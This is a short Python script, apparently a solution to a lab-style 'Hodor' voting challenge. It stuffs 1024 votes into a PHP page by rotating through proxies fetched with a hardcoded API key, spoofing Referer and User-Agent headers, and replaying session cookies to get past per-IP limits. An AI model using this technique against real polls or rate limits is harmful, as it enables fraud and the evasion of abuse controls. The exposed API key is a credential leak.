#!/usr/bin/python3
"""module requests hodor"""
import requests
from itertools import cycle
import json


url = "http://158.69.76.135/level4.php"

header = {'Referer': url, 'Date': 'Tues, 09 Jun 2020 00:13:11 GMT',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
            AppleWebKit/537.36 (KHTML, like Gsecko)\
            Chrome/83.0.4103.61 Safari/537.36'}

votos = 0
pr = requests.get('https://proxy11.com/api/proxy.json?key=MTMzOA.Xt2m0w.jtVstg35sFtPaXF2f59yKj3KqPY')
json_file = json.loads(pr.content)
proxy_cycle = cycle(json_file['data'])
response = requests.get(url)
while votos < 1024:
    proxy_ = next(proxy_cycle)
    proxy = str(proxy_['ip'])+':'+str(proxy_['port'])
    print(proxy)
    proxies = {"http": proxy, "https": proxy}
    key_HoldTheDoor = response.cookies["HoldTheDoor"]
    params = {'id': '1729', 'holdthedoor': 'submit', 'key': key_HoldTheDoor}
    cookies_hodor = {"HoldTheDoor": key_HoldTheDoor}
    try:
        response = requests.post(url, data=params, headers=header,
                                 cookies=cookies_hodor, proxies=proxies)
        if response.status_code != 200:
            response = requests.get(url)
        votos += 1
        print("voto number: {}".format(votos))
    except Exception:
        response = requests.get(url)
        continue

print("Voting complete!")
